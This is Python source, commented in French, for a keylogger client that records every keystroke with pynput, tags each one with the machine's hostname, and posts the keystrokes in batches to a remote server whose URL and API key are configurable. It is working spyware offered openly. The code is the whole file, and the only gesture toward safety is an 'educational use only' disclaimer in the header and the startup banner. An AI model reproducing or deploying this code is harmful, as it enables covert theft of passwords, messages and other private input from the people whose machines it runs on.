#!/usr/bin/env python3
"""
Keylogger Client - Envoie les données à un serveur distant
===========================================================
⚠️ AVERTISSEMENT: À usage éducatif uniquement

Ce client capture les frappes et les envoie à ton serveur web
"""

import os
import sys
from datetime import datetime
from pynput import keyboard
import requests
import threading
import queue
import time
import json
import socket

class KeyloggerClient:
    """
    Client qui envoie les frappes à un serveur distant
    """
    
    def __init__(self, server_url, api_key, buffer_size=10):
        self.server_url = server_url.rstrip('/')
        self.api_key = api_key
        self.buffer = queue.Queue()
        self.buffer_size = buffer_size
        self.running = False
        self.listener = None
        self.sender_thread = None
        
        # Identifier cette machine
        self.machine_id = socket.gethostname()
        
        print(f"[+] Machine ID: {self.machine_id}")
        print(f"[+] Serveur: {self.server_url}")
    
    def on_press(self, key):
        """Callback pour chaque touche"""
        try:
            timestamp = datetime.now().isoformat()
            
            if hasattr(key, 'char') and key.char is not None:
                key_data = {
                    'timestamp': timestamp,
                    'machine_id': self.machine_id,
                    'key': key.char,
                    'type': 'char'
                }
            else:
                key_name = str(key).replace('Key.', '')
                key_data = {
                    'timestamp': timestamp,
                    'machine_id': self.machine_id,
                    'key': key_name,
                    'type': 'special'
                }
            
            self.buffer.put(key_data)
            print(f"[CAPTURE] {key_data['key']}")
            
        except Exception as e:
            print(f"[!] Erreur capture: {e}")
    
    def on_release(self, key):
        """Arrêt avec ESC"""
        if key == keyboard.Key.esc:
            print("\n[!] Arrêt demandé...")
            return False
    
    def send_batch(self, batch):
        """Envoie un lot de frappes au serveur"""
        try:
            headers = {
                'Authorization': f'Bearer {self.api_key}',
                'Content-Type': 'application/json'
            }
            
            response = requests.post(
                f'{self.server_url}/api/keylog',
                json={'keys': batch},
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"[✓] Envoyé {len(batch)} touches au serveur")
                return True
            else:
                print(f"[!] Erreur serveur: {response.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Erreur connexion: {e}")
            return False
    
    def sender_worker(self):
        """Thread qui envoie les données par lots"""
        batch = []
        
        while self.running or not self.buffer.empty():
            try:
                key_data = self.buffer.get(timeout=2)
                batch.append(key_data)
                
                # Envoyer quand le batch est plein
                if len(batch) >= self.buffer_size:
                    if self.send_batch(batch):
                        batch.clear()
                    else:
                        # Garder pour réessayer
                        print("[!] Réessai dans 5 secondes...")
                        time.sleep(5)
                    
            except queue.Empty:
                # Envoyer ce qui reste
                if batch:
                    if self.send_batch(batch):
                        batch.clear()
        
        # Envoyer les dernières données
        if batch:
            self.send_batch(batch)
    
    def test_connection(self):
        """Teste la connexion au serveur"""
        try:
            response = requests.get(
                f'{self.server_url}/api/ping',
                headers={'Authorization': f'Bearer {self.api_key}'},
                timeout=5
            )
            if response.status_code == 200:
                print("[✓] Connexion au serveur réussie")
                return True
            else:
                print(f"[!] Erreur serveur: {response.status_code}")
                return False
        except Exception as e:
            print(f"[!] Impossible de contacter le serveur: {e}")
            return False
    
    def start(self):
        """Démarre le client"""
        print("\n" + "="*60)
        print("🔑 KEYLOGGER CLIENT - Mode Serveur Distant")
        print("="*60)
        print("⚠️  À usage éducatif uniquement")
        print("="*60 + "\n")
        
        # Tester la connexion
        print("[+] Test de connexion au serveur...")
        if not self.test_connection():
            print("[!] Impossible de continuer sans connexion serveur")
            return
        
        print("[+] Démarrage de la capture...")
        print("[+] Appuie sur ESC pour arrêter\n")
        
        self.running = True
        
        # Démarrer le thread d'envoi
        self.sender_thread = threading.Thread(target=self.sender_worker, daemon=True)
        self.sender_thread.start()
        
        # Démarrer le listener
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        ) as self.listener:
            self.listener.join()
        
        self.stop()
    
    def stop(self):
        """Arrêt propre"""
        print("\n[+] Arrêt du client...")
        self.running = False
        
        if self.sender_thread:
            self.sender_thread.join(timeout=10)
        
        print("[+] Client arrêté\n")


def main():
    """Fonction principale"""
    
    # Configuration
    if len(sys.argv) < 3:
        print("Usage: python3 keylogger_client.py <SERVER_URL> <API_KEY>")
        print("\nExemple:")
        print("  python3 keylogger_client.py https://ton-serveur.com secret123")
        print("\nOu configure dans le script directement")
        
        # Configuration par défaut (à modifier)
        SERVER_URL = "https://ton-domaine.com"  # ← Change ici
        API_KEY = "ta-cle-secrete-123"          # ← Change ici
        
        print(f"\nUtilisation de la config par défaut:")
        print(f"  Serveur: {SERVER_URL}")
        print(f"  API Key: {API_KEY[:10]}...")
        
        response = input("\nContinuer avec cette config? (o/n): ")
        if response.lower() not in ['o', 'oui', 'y', 'yes']:
            sys.exit(0)
    else:
        SERVER_URL = sys.argv[1]
        API_KEY = sys.argv[2]
    
    try:
        client = KeyloggerClient(
            server_url=SERVER_URL,
            api_key=API_KEY,
            buffer_size=5
        )
        client.start()
        
    except KeyboardInterrupt:
        print("\n\n[!] Interruption par l'utilisateur")
    except Exception as e:
        print(f"\n[!] Erreur: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
